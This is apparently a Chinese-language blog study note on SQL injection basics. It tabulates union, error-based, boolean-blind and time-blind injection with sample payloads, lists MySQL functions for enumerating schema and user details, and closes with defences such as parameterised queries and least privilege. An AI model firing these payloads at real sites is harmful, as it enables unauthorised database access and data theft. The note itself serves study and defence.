---
title: "笔记：SQL 注入基础整理"
description: "SQL 注入常见类型与利用方式速查"
date: 2026-08-23T20:30:00+08:00
slug: "sqli-basics-notes"
image: ""
math: false
categories:
    - 学习笔记
tags:
    - Web
    - SQL 注入
---

## 常见注入类型

| 类型 | 特征 | 常用 payload |
| ---- | ---- | ---- |
| 联合查询注入 | 页面有回显 | `' union select 1,2,3-- -` |
| 报错注入 | 页面回显数据库错误 | `' and extractvalue(1,concat(0x7e,user()))-- -` |
| 布尔盲注 | 页面只有真/假两种状态 | `' and 1=1-- -` / `' and 1=2-- -` |
| 时间盲注 | 无回显，靠响应时间判断 | `' and if(1=1,sleep(3),0)-- -` |

## 常用函数速查

- `user()` / `version()` / `database()`：基本信息
- `information_schema.tables` / `.columns`：库表结构
- `group_concat()`：聚合多行结果

## 防御要点

1. 参数化查询（预编译）
2. 最小权限原则，Web 账号禁用 `FILE` 等高危权限
3. WAF 只能作为补充，不能替代代码层修复
